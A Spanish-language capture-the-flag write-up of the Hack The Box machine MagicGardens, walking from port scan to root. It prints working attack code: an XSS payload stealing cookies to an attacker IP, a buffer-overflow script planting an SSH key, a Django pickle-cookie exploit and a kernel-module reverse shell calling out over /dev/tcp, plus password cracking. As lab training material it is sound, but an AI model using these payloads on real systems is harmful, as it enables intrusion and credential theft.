---
layout: single
title: write up MagicGardens HTB
excerpt:
date: 2025-2-13
classes: wide
header:
  teaser: https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/MagicGardens_avatar.png
  teaser_home_page: true
categories:
  - ctf
  - htb-magicgardens
  - hackthebox
  - nmap
  - docker-registry
  - django
  - feroxbuster
  - python
  - flask
  - qrcode
  - qrcode-xss
  - xss
  - hashcat
  - ghidra
  - bof
  - arbitrary-write
  - ipv4
  - ipv6
  - pattern-create
  - htpasswd
  - dockerregistrygrabber
  - deserialization
  - pickle
  - django-deserialization
  - django-pickle
  - cap-sys-module
  - kernel-module
tags:  
  - ctf
  - htb-magicgardens
  - hackthebox
  - nmap
  - docker-registry
  - django
  - feroxbuster
  - python
  - flask
  - qrcode
  - qrcode-xss
  - xss
  - hashcat
  - ghidra
  - bof
  - arbitrary-write
  - ipv4
  - ipv6
  - pattern-create
  - htpasswd
  - dockerregistrygrabber
  - deserialization
  - pickle
  - django-deserialization
  - django-pickle
  - cap-sys-module
  - kernel-module
---

lo primero como siempre el escaneo de nmap:
```bash
nmap -p- --open --min-rate 5000 -sn -sT -Pn -n -vvv 10.10.11.9
```
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213164845.png)

```bash
nmap -sVC -p 22,80,1337,5000 10.10.11.9
```
```bash
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
|_  256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
80/tcp   open  http     nginx 1.22.1
|_http-title: Magic Gardens
|_http-server-header: nginx/1.22.1
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
|_    [x] Handshake error
5000/tcp open  ssl/http Docker Registry (API: 2.0)
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-05-23T11:57:43
|_Not valid after:  2024-05-22T11:57:43
|_http-title: Site doesn't have a title.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94SVN%I=7%D=2/1%Time=679E767D%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\[x
SF:\]\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x20
SF:error\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPCCh
SF:eck,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"\[
SF:x\]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(Ter
SF:minalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15,"
SF:\[x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0")%
SF:r(LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,15,
SF:"\[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshake\
SF:x20error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")%r
SF:(NCP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Hand
SF:shake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%r(
SF:ms-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Hands
SF:hake\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

el escaneo encuentra dos puesrtos curiosos. el 80 con un dominio magicgardens.htb y un docker en el 5000

poenemos el dominio en el /etc/hosts y hacedemos a la web
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250211112440.png)

la pagina en si es una pagina de compra de flores. funciona como toda tienda normal. permite añadir al carrito y comprar. siempre que pongo la info para comrar recivo un mensaje de que el pedido se esta procesando

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212110644.png)

tambien puedo crear una cuenta. y generar un qr raro para comprar una nueva sub


![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212110941.png)

al selecionar el banco nos salen 3 posibles opciones  honestbank.htb, magicalbank.htb, and plunders.htb. esto por si acaso lo añadimos en el etc/hosts por si tiene que hacer algo con la API

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212111309.png)

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212111653.png)

si le damos a suscribir hace una peticion en POST ala propia tienda  y un nuevo mensaje flash explicando que mi suscripción se está procesando. Al actualizar la página aparece un mensaje de error sobre problemas con el pago.

si pillamos la peticion en burpsuite vemos que podemos cambiar la peticion para que en vez al banco haga ping a nuestra ip :

nos ponemos en escucha con netcat:
```bash
nc -lnvp 80
```

```bash
Escuchando en 0.0.0.0 80
Conexión recibida en 10.10.11.9 49908
POST /api/payments/ HTTP/1.1
Host: 10.10.14.233
Usuario-Agente: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Aceptar: */*
Conexión: keep-alive
Contenido-Longitud: 129
Content-Type: application/json

{«cardname»: «0xdf», “cardnumber”: «1111-2222-3333-4444», “expmonth”: «September», “expyear”: «2026», “cvv”: «420», “amount”: 25}
```

Así que cuando intento pagar, envía una petición a /api/payments/ en el banco usando el módulo de peticiones de Python.

que pasa que si hacemos esta peticion nos devuelve un estado 402 Pago requerido y una carga útil JSON con el código de estado, el mensaje y el nombre y número de tarjeta del mensaje original. Este es probablemente el formato esperado por la tienda.

con python podriamos crear un servidor sencillo que intente imitar la API real 

```python
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

class BankAPIHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        post_data = self.rfile.read(content_length).decode('utf-8')

        data = json.loads(post_data)

        response = {
            'status': '200',
            'message': 'OK',
            'cardname': data['cardname'],
            'cardnumber': data['cardnumber']
        }

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode('utf-8'))


def run_server():
    server_address = ('0.0.0.0', 80)
    httpd = HTTPServer(server_address, BankAPIHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()


if __name__ == '__main__':
    run_server()

```

repetimos el proceso de burpsuite pero redirecionamos a nuestro exploit
si lo emos echo vien saldra esto:

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212122631.png)
ahora cada vez que intentamos hacer una compra recibo un mensaje de morty pidiendome el qr
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212123622.png)
aqui podriamos intentar colar un XSS en una imagen de esta forma

```bash
qrencode -o xss-poc.png '465e929fc1e0853025faad58fc8cb47d.0d341bcdc6746f1d452b3f4de32357b9.0xdf<script>img=new Image(); img.src="http://10.10.14.233/?c=" + document.cookie;</script>'
```

le pasamos la imagen y ganamos la cookie de morty

```bash
10.10.11.9 - - [02/Feb/2025 10:43:03] "GET /?c=csrftoken=gs5PGLZyqUt4cwgOZu6s2iJfnv6Bxo04;%20sessionid=.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1tec94:pgxZ_OL42x44OoYBHLKHdXAWlvtbt3iGgv9vvUnP9GM HTTP/1.1" 200 -
```

la ponemos en nuestro navegador y ya como morti podemos acceder a /admin puedo ver los objetos almacenados en la base de datos. Desafortunadamente el hash de la contraseña del usuario (admin) morty no es visible, pero también está registrado como Usuario de la Tienda y ahí puedo coger su hash de contraseña.
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212124532.png)

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250212124638.png)

tenemos el hahs y lo procedemos a romper con hashcat

```bash
hashcat hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

pbkdf2_sha256$600000$y7K056G3KxbaRc40ioQE8j$e7bq8dE/U+yIiZ8isA0Dc0wuL0gYI3GjmmdzNU+Nl7I=:jonasbrothers

```
y provamos a haceder por SSH
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213165745.png)

ejecuto linpheas.sh y veo algo curioso
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213170400.png)
hay un segundo usuario llamado alex
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213170630.png)
aparte esta ejecutando harvest
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213171223.png)

y el puerto de ejecucion es el 1337

podemos probar a aconectarnos de esta forma:
```bash
harvest client 127.0.0.1
```

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250213171500.png)

y nos salta esto

si el binario de harvest /usr/local/bin/harvest nos lo pasamos a nuestra mquina y lo analizamos con por ejemplo gidra o algun semejante 
```c
void handle_raw_packets(int param_1,undefined8 param_2,undefined8 param_3)
 
{
  ssize_t sVar1;
  char *pcVar2;
  char acStack_1007a [8];
  undefined uStack_10072;
  time_t tStack_10070;
  char acStack_10068 [32];
  char acStack_10048 [32];
  byte bStack_10028;
  byte bStack_10027;
  byte bStack_10026;
  byte bStack_10025;
  byte bStack_10024;
  byte bStack_10023;
  byte bStack_10022;
  byte bStack_10021;
  byte bStack_10020;
  byte bStack_1001f;
  byte bStack_1001e;
  byte bStack_1001d;
  char packet [65554];
  
  memset(&bStack_10028,0,0xffff);
  sVar1 = recvfrom(param_1,&bStack_10028,0xffff,0,(sockaddr *)0x0,(socklen_t *)0x0);
  tStack_10070 = time((time_t *)0x0);
  pcVar2 = ctime(&tStack_10070);
  strncpy(acStack_1007a,pcVar2 + 0xb,8);
  uStack_10072 = 0;
  if ((uint)sVar1 < 0x28) {
    puts("Incomplete packet ");
    close(param_1);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  sprintf(acStack_10048,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",(ulong)bStack_10022,(ulong)bStack_10021,
          (ulong)bStack_10020,(ulong)bStack_1001f,(ulong)bStack_1001e,(ulong)bStack_1001d);
  sprintf(acStack_10068,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",(ulong)bStack_10028,(ulong)bStack_10027,
          (ulong)bStack_10026,(ulong)bStack_10025,(ulong)bStack_10024,(ulong)bStack_10023);
  /* IPv4 */
  if (packet[0] == 0x45) {
    print_packet(packet,param_3,param_2,acStack_10048,acStack_10068,acStack_1007a,&bStack_10028);
  }
  /* IPv6 */
  if (packet[0] == 0x60) {
    log_packet(packet,param_3);
  }
  return;
}
```

dentro de la funcion log_packet inicializa un nuevo buffer con longitud 65360, seguido directamente por el nombre del fichero log.

esto es curioso.  porque en la función de llamada el buffer era más grande. Esto podría abrir un camino para desbordar el buffer y luego sobrescribir el nombre real del archivo.

```c
undefined8 log_packet(long packet_data,char *filename)
 
{
  uint16_t payload_length;
  char packet_buffer [65360];
  char file_name [40];
  FILE *log_file;
  
  payload_length = htons(*(uint16_t *)(packet_data + 4));
  if (payload_length != 0) {
    strcpy(file_name,filename);
    strncpy(packet_buffer,(char *)(packet_data + 0x3c),(ulong)payload_length);
    (packet_buffer + payload_length)[0] = '\n';
    (packet_buffer + payload_length)[1] = '\0';
    log_file = fopen(file_name,"w");
    if (log_file == (FILE *)0x0) {
      puts("Bad log file");
    }
    else {
      fprintf(log_file,packet_buffer);
      fclose(log_file);
      puts("[!] Suspicious activity. Packages have been logged.");
    }
  }
  return 0;
}
```

vale como hacemos este buffer overflow? 
 pues de la siguiente manera

creamos una clave publica ssh en nuestra mquina atacante

```bash
ssh-keygen -t rsa
```

hacemos un cat al el .pub y sacamos la clave para ponerlo en el siguiente exploit:

```python
import socket

dst = ("::1", 8443)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(dst)
file_name = b"/home/alex/.ssh/authorized_keys"
data = b"A" * 12
data += b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdx/HrxLsv70mErY5W+4Twq302Kuo1n1Q2Ot1Qi6j9w7AcsGq1EcEH+Nz7lnKomq2pQwiIqURiESHpKkirx4m2kWGw6RMORkxPUvfLOt1mhkoGB49AT90YYvfFexdcYB/iHQef0HN1GiFE5PKYUToSmSFBnimcBaNAZ6RioEj3JUZyqvQtTleWfKJdOYmNVf94B9TfB6IhkBaJ8cLcyz6cykBYuJGmTIFNr9oZXOtkFPyyg09oBm2widzUCywFvqQzJLNRzeW9jtIFJtHPatCUjcdLGAUhmacTSlVplTU8+C3AjAhEnGfbc0KPOWfBtDYX5oLJ/9CI5GQNS4P8TrdLOPo2BuUwr1kQIGuPyVUSe5iqPgs6+HyTwaVmlN77UoyyFoMtO4i5T8AnHGE9dOXORKuMyfkdEx4vPz6AafI0LYySEGjNQyRxF/VZMQZh/nJBcN2JVFXmGYA6ae7BPeJ2XRZXORTJs1vNIo26ZiefDXENM8UXj6wnuTcDSKRegVE= zzero@zzero"
data += b"\n" * (65360 + 12 - len(data))
data += file_name
s.sendto(data, dst)
```

ahora en nuestra maquina ejecutamos esto sobre el binario de harvest:

```bash
./harvest client 10.10.11.9
```

y ejecutamos el exploit en la maquina victima (DENTRO DE ELLA)

si todo a hido bien deveriamos poder hacer 
```bash
ssh -i id_rsa alex@10.10.11.9
```

y estar dentro
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215132635.png)
## root

si vamos a /var/spool/mail veremos dos archivo interesantes:

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215132845.png)

si hacemos un cat al de alex veremos lo siguiente:
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215133044.png)

Antes de extraer el hash con zip2john decodifico el archivo adjunto codificado en base64 y lo paso a un archivo. Luego ejecuto john para intentar descifrar la contraseña. Eso tiene éxito y puedo descomprimir el archivo con realmadrid.
```bash
$ echo "UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44Sq4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIeAwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pGZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=" \
       | base64 -d > auth.zip
 
$ zip2john auth.zip > hash
ver 1.0 efh 5455 efh 7875 auth.zip/htpasswd PKZIP Encr: 2b chk, TS_chk, cmplen=84, decmplen=72, crc=B238A674 ts=A86E cs=a86e type=0
 
$ john --fork=10 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
realmadrid       (auth.zip/htpasswd)
```

el .zip contiene la passwor de AlexMiles : AlexMiles:$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq

que la podemos romper con jhon y nos da la contraseña Diamonds

```bash
john --fork=10 --wordlist=/usr/share/wordlists/rockyou.txt htpasswd
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
diamonds         (AlexMiles)
```

Con las credenciales AlexMiles:diamonds puedo autenticarme en el Docker Registry que se ejecuta en el puerto 5000. 

con esto podemos usar DockerRegistryGrabber para descargar imagenes

```bash
python drg.py -U AlexMiles -P diamonds https://magicgardens.htb --dump magicgardens.htb
```

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215140022.png)

En lugar de revisar cada capa de manera individual, extraigo todas las capas en el directorio de salida para obtener el sistema de archivos completo de la imagen final. El orden adecuado se determina según la marca de tiempo de creación, como se mostró en el script Python anterior. Dentro de los archivos extraídos, es posible encontrar el código fuente de la aplicación, incluyendo su SECRET_KEY en un archivo de entorno.

```bash
$ ls -1c -r *.gz | while read x; do tar xf "$x" -C out/ ; done
 
$ ls -la out/user/src/app
total 212
drwxr-xr-x 6 ryuki ryuki   4096 Aug 28  2023 .
drwxr-xr-x 7 ryuki ryuki   4096 Jul 14  2023 ..
-rwxr-x--- 1 ryuki ryuki     97 Aug 11  2023 .env
drwxr-x--- 3 ryuki ryuki   4096 Aug 11  2023 app
-rwxr-x--- 1 ryuki ryuki 176128 Aug 11  2023 db.sqlite3
-rwxr-x--- 1 ryuki ryuki    156 Aug 11  2023 entrypoint.sh
-rwxr-x--- 1 ryuki ryuki    561 Aug 11  2023 manage.py
drwxr-x--- 6 ryuki ryuki   4096 Aug 11  2023 media
-rwxr-x--- 1 ryuki ryuki     77 Aug 11  2023 requirements.txt
drwxr-x--- 4 ryuki ryuki   4096 Aug 11  2023 static
drwxr-x--- 6 ryuki ryuki   4096 Aug 11  2023 store
 
$ cat out/user/src/app/.env
DEBUG=False
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b
```

Django utiliza el pickling para almacenar información en las cookies2, por lo que en cuanto se filtra la SECRET_KEY, es posible falsificar cookies válidas que se deserializan en la aplicación.

y con ello hacer un explot para acceder
```bash
import os
import sys
import django.core.signing
import requests
from django.conf import settings
from django.contrib.sessions.serializers import PickleSerializer


class PickleRCE(object):
    def __reduce__(self):
        #return (os.system, ("sleep 30",))
        #return (os.system, ("ping -c 1 10.10.14.6",))
        # return (os.system, ("curl 10.10.14.6/django",))
        return (os.system, (f"bash -c 'bash -i >& /dev/tcp/{sys.argv[2]}/{sys.argv[3]} 0>&1'",))
    

if len(sys.argv) != 4:
    print(f"{sys.argv[0]} <url> <shell ip> <shell port>")
    sys.exit(1)

url = sys.argv[1] if sys.argv[1].startswith('http') else f'http://{sys.argv[1]}'

salt = "django.contrib.sessions.backends.signed_cookies"
settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")
cookie = '.eJxNjU1qwzAQhZNFQgMphZyi3QhLluNoV7rvqgcwkixFbhMJ9EPpotADzHJ63zpuAp7d977Hm5_V7265mO4bH-GuJBO9PBuE1TnE_IWwTlnmksbgLUtrETafQ3LdaUgZYYGwnVCH4rOJ6Naw0TLmfz_SdqKZvu9kya67POqGHmHJEHazTEn9Yfwonvp36Y-B6OBzHBS5VMjVJvIaenN6uXUfZgNOJofwTBttmW0FrU3VcGbMgWlRKcWptIIy2Ryqfa1t0-o9VYqpyrCaG061amuuhcBC_gDes2X7:1syw7a:K6fl5qRtI2__XhrMZZXCPZdj-jCmV9e6y5mWRH6lbio'
 
cookie_obj = django.core.signing.loads(cookie, serializer=PickleSerializer,salt=salt)
cookie_obj['testcookie'] = PickleRCE()

new_cookie = django.core.signing.dumps(cookie_obj,serializer=PickleSerializer,salt=salt,compress=True)
print(f"[+] Generated malicious cookie: {new_cookie}")
requests.get("http://magicgardens.htb", cookies={"sessionid": new_cookie})
```

ahora si ejecutamos este exploit y nos ponemos en escucha en el puesrto que emos especificado

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215143719.png)

vale vamos a ver las capavilitis del usuario:
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215143958.png)

El listado de capacidades revela el módulo cap_sys_module, que permite al contenedor cargar y descargar módulos del kernel.

por lo que podemos hacer lo sigiente

subimos esta revershell en c a la maquina por wget:
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
 
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.7/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
 
static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}
 
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

y este makefile

```bash
obj-m +=reverse-shell.c
 
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

nos ponemos en eschucha y ejecutamos un make para que todo se cree
![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215144527.png)

y por ultimo un insmod reverse-shell.ko para obtener la shell

![](https://404zzero.github.io/zzero.github.io//assets/images/MagicGardens/Pasted-image-20250215144847.png)

y somos root